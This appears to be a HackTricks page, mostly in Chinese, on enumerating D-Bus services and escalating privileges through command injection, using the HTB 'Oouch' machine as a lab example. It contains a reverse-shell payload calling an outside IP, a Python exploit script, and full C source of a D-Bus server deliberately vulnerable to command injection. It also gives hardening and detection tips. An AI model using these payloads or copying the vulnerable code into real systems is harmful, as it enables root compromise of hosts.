# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus 在 Ubuntu desktop 环境中被用作进程间通信（IPC）中介。在 Ubuntu 上，可以观察到多个 message buses 并发运行：system bus，主要由 **privileged services 用于暴露整个系统范围内相关的服务**，以及每个已登录用户的 session bus，暴露仅与该特定用户相关的服务。这里主要关注 system bus，因为它与以更高权限（例如 root）运行的服务相关，而我们的目标是提升权限。需要指出的是，D-Bus 的架构为每个 session bus 使用一个“router”，其职责是根据客户端为其希望通信的 service 指定的 address，将 client messages 转发到相应的 services。

D-Bus 上的 Services 由其暴露的 **objects** 和 **interfaces** 定义。Objects 可以类比为标准 OOP languages 中的 class instances，每个 instance 都由一个唯一的 **object path** 标识。这个 path 类似 filesystem path，能够唯一标识该 service 暴露的每个 object。一个适合研究的关键 interface 是 **org.freedesktop.DBus.Introspectable** interface，它只有一个方法 Introspect。该方法返回该 object 支持的 methods、signals 和 properties 的 XML 表示，这里重点关注 methods，而忽略 properties 和 signals。

为了与 D-Bus interface 通信，使用了两个 tool：一个名为 **gdbus** 的 CLI tool，用于在 scripts 中方便地调用 D-Bus 暴露的方法，以及 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)，一个基于 Python 的 GUI tool，用于枚举每个 bus 上可用的 services，并显示每个 service 中包含的 objects。
```bash
sudo apt-get install d-feet
```
如果你正在检查 **session bus**，请先确认当前地址：
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

在第一张图片中，显示了注册到 D-Bus system bus 的服务，选择 System Bus 按钮后，**org.debin.apt** 被特别高亮显示。D-Feet 会查询该服务的 objects，展示所选 object 的 interfaces、methods、properties 和 signals，如第二张图片所示。每个 method 的 signature 也会被详细显示。

一个值得注意的特性是会显示该服务的 **process ID (pid)** 和 **command line**，这有助于确认该服务是否以提权权限运行，这对研究是否相关很重要。

**D-Feet 也允许调用 method**：用户可以输入 Python expressions 作为参数，D-Feet 会在传递给服务之前将其转换为 D-Bus types。

不过要注意，**某些 methods 需要 authentication** 才能允许我们调用。我们会忽略这些 methods，因为我们的目标是先在没有 credentials 的情况下提升权限。

还要注意，某些 services 会查询另一个名为 org.freedeskto.PolicyKit1 的 D-Bus service，判断用户是否被允许执行某些 actions。

## **Cmd line Enumeration**

### List Service Objects

可以使用以下方式列出已打开的 D-Bus interfaces：
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
标记为 **`(activatable)`** 的服务尤其值得关注，因为它们**尚未运行**，但可以通过总线请求按需启动。不要只停留在 `busctl list`；要把这些名称映射到它们实际会执行的二进制文件。
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
这会快速告诉你，哪个 `Exec=` path 会为一个可激活名称启动，以及以哪个身份运行。如果 binary 或其 execution chain 保护薄弱，一个 inactive service 仍然可能成为 privilege-escalation 路径。

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) 当一个 process 建立到 bus 的 connection 时，bus 会为该 connection 分配一个特殊的 bus name，称为 _unique connection name_。这种类型的 bus name 是不可变的——可以保证只要 connection 存在，它就不会改变——更重要的是，在 bus 生命周期内它不能被复用。这意味着，任何其他到该 bus 的 connection 都不会被分配到这样的 unique connection name，即使同一个 process 关闭了到 bus 的 connection 并重新创建一个新的。Unique connection names 很容易识别，因为它们以那个原本被禁止的冒号字符开头。

### Service Object Info

然后，你可以通过以下方式获取有关 interface 的一些信息：
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
同时将总线名称与其 `systemd` 单元和可执行路径关联起来：
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
这回答了在 privesc 期间真正重要的操作问题：**如果一个 method call 成功了，哪个真实的 binary 和 unit 会执行该动作？**

### 列出 Service Object 的 Interfaces

你需要有足够的 permissions。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 服务对象的 Introspect Interface

注意，在这个示例中，使用 `tree` 参数选择了最新发现的 interface（_see previous section_）：
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
注意接口 `htb.oouch.Block` 的方法 `.Block`（我们感兴趣的那个）。其他列中的 “s” 可能表示它期望一个字符串。

在尝试任何危险操作之前，先验证一个**只读导向**或其他低风险方法。这可以清晰地区分三种情况：语法错误、可达但被拒绝，或者可达且被允许。
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### 将 D-Bus Methods 与 Policies 和 Actions 关联起来

Introspection 会告诉你**能调用什么**，但不会告诉你**为什么**某个调用会被允许或拒绝。对于真正的 privesc triage，你通常需要同时检查**三层**：

1. **Activation metadata**（`.service` 文件或 `SystemdService=`），用来了解实际会运行哪个 binary 和 unit。
2. **D-Bus XML policy**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`），用来了解谁可以 `own`、`send_destination` 或 `receive_sender`。
3. **Polkit action files**（`/usr/share/polkit-1/actions/*.policy`），用来了解默认的 authorization model（`allow_active`、`allow_inactive`、`auth_admin`、`auth_self`、`org.freedesktop.policykit.imply`）。

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
不要假设一个 D-Bus method 和一个 Polkit action 之间存在 1:1 映射。同一个 method 可能会根据被修改的 object 或运行时上下文选择不同的 action。因此，实际工作流程是：

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` 并 grep 相关的 `.policy` files
3. 使用 `busctl call`、`gdbus call` 或 `dbusmap --enable-probes --null-agent` 进行低风险的 live probes

Proxy 或兼容性 services 值得额外关注。一个 **root-running proxy** 会通过它自己预先建立的 connection 将请求转发给另一个 D-Bus service，如果没有重新验证原始调用者的身份，就可能会让 backend 误以为每个 request 都来自 UID 0。

### Monitor/Capture Interface

在拥有足够 privileges 的情况下（仅有 `send_destination` 和 `receive_sender` privileges 还不够），你可以 **monitor a D-Bus communication**。

要 **monitor** 一次 **communication**，你需要是 **root.** 如果你仍然在 root 下发现问题，请查看 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 和 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> 如果你知道如何配置一个 D-Bus config file 来 **allow non root users to sniff** 这个 communication，请 **contact me**！

监控的方法有：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
在下面的示例中，接口 `htb.oouch.Block` 被监控，并且 **消息 "**_**lalalalal**_**" 通过错误通信发送**：
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
你可以使用 `capture` 代替 `monitor` 将结果保存为 Wireshark 可打开的 **pcapng** 文件：
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### 过滤所有噪音 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

如果 bus 上的信息太多，可以像这样传递一个 match rule：
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
可以指定多个规则。如果某条消息匹配 _任意_ 规则，则会打印该消息。如下：
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.

### More

`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
请注意，根据之前的配置，**你需要是用户 `root` 或 `www-data` 才能通过这个 D-BUS 通信发送和接收信息**。

作为 docker 容器 **aeb4525789d8** 中的用户 **qtc**，你可以在文件 _/code/oouch/routes.py_ 中找到一些与 dbus 相关的代码。这段代码很有意思：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
正如你所看到的，它正在**连接到一个 D-Bus interface**，并向 **"Block" function** 发送 **"client_ip"**。

在 D-Bus 连接的另一端有一些编译后的 C binary 在运行。这个代码正在 D-Bus connection 上**监听** **IP address**，并通过 `system` function 调用 `iptables` 来 block 给定的 IP address。\
**对 `system` 的调用是故意存在 command injection 漏洞的**，所以像下面这样的 payload 会创建一个 reverse shell：`;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### 利用它

在本页末尾你可以找到 **D-Bus application 的完整 C code**。在其中你可以在第 91-97 行之间找到 **D-Bus object path** 和 **interface name** 是如何被**注册**的。这些信息将用于向 D-Bus connection 发送信息：
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
另外，在第57行你可以看到，**为这个 D-Bus 通信注册的唯一方法**叫做 `Block`(_**这就是为什么在下面的部分中，payload 将会被发送到 service object `htb.oouch.Block`、interface `/htb/oouch/Block` 以及 method name `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

下面的 python 代码会将 payload 通过 `block_iface.Block(runme)` 发送到 D-Bus 连接的 `Block` 方法（_注意它是从前一段代码中提取出来的_）：
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 和 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` 是一个用于向 “Message Bus” 发送消息的工具
- Message Bus – 一种被系统用来方便地在应用程序之间进行通信的软件。它与 Message Queue 相关（消息按顺序排列），但在 Message Bus 中，消息是以订阅模型发送的，而且速度也非常快。
- “-system” 标签用于表明这是一个 system 消息，而不是 session 消息（默认情况下）。
- “–print-reply” 标签用于适当地打印我们的消息，并以人类可读的格式接收任何回复。
- “–dest=Dbus-Interface-Block” Dbus interface 的地址。
- “–string:” – 我们想要发送到 interface 的消息类型。发送消息有多种格式，例如 double、bytes、booleans、int、objpath。其中，“object path” 在我们想要向 Dbus interface 发送文件路径时很有用。在这种情况下，我们可以使用一个特殊文件（FIFO）来以文件名的形式向 interface 传递命令。“string:;” – 这是为了再次调用 object path，我们在其中放置 FIFO reverse shell 文件/命令。

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

手动使用 `busctl`/`gdbus` 对大规模 D-Bus attack surface 进行枚举会很快变得痛苦。近几年发布的两个小型 FOSS 工具可以在 red-team 或 CTF 场景中加快这个过程：

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* 用 C 编写；单个静态二进制文件（<50 kB），会遍历每个 object path，拉取 `Introspect` XML，并将其映射到所属的 PID/UID。
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* 该工具会用 `!` 标记未受保护的 well-known names，能立刻暴露出你可以 *own*（接管）的服务，或者从非特权 shell 就能访问的方法调用。

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* 仅 Python 的脚本，用于查找 systemd units 中可写的路径，**以及** 过于宽松的 D-Bus policy files（例如 `send_destination="*"`）。
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module 会搜索下面这些目录，并高亮任何可以被普通用户 spoof 或 hijack 的 service：
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

关注最近公开的 CVEs 有助于发现自定义代码中的类似不安全模式。两个不错的近期例子是：

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | 以 root 运行的 service 暴露了一个 D-Bus interface，非特权用户可以重新配置它，包括加载攻击者控制的 macro 行为。 | 如果一个 daemon 在 system bus 上暴露 **device/profile/config management**，请把可写配置和 macro 功能视为代码执行原语，而不只是“settings”。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | 一个以 root 运行的 compatibility proxy 在转发请求到后端 service 时，没有保留原始调用者的 security context，因此后端将该 proxy 视为 UID 0 来信任。 | 将 **proxy / bridge / compatibility** D-Bus services 视为一个单独的 bug class：如果它们转发特权调用，验证调用者的 UID/Polkit context 是如何传递到后端的。 |

需要注意的模式：
1. Service 以 **root 身份在 system bus 上运行**。
2. 要么 **没有 authorization check**，要么检查是针对 **错误的 subject** 执行的。
3. 可达的方法最终会改变系统状态：package install、user/group 变更、bootloader 配置、device profile 更新、文件写入，或者直接命令执行。

使用 `dbusmap --enable-probes` 或手动 `busctl call` 来确认某个方法是否可达，然后检查 service 的 policy XML 和 Polkit actions，以理解**究竟是哪个 subject** 在被授权。

---

## Hardening & Detection Quick-Wins

* 搜索 world-writable 或 *send/receive*-open 的 policies：
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 对危险方法要求 Polkit——即使是 *root* proxies，也应将 *caller* 的 PID 传递给 `polkit_authority_check_authorization_sync()`，而不是使用它们自己的 PID。
* 在长期运行的 helper 中降权（连接到 bus 后，使用 `sd_pid_get_owner_uid()` 切换 namespaces）。
* 如果无法移除某个 service，至少将其 *scope* 限定到专用 Unix group，并在其 XML policy 中限制访问。
* Blue-team：抓取 system bus：`busctl capture > /var/log/dbus_$(date +%F).pcapng`，然后导入 Wireshark 做异常检测。

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
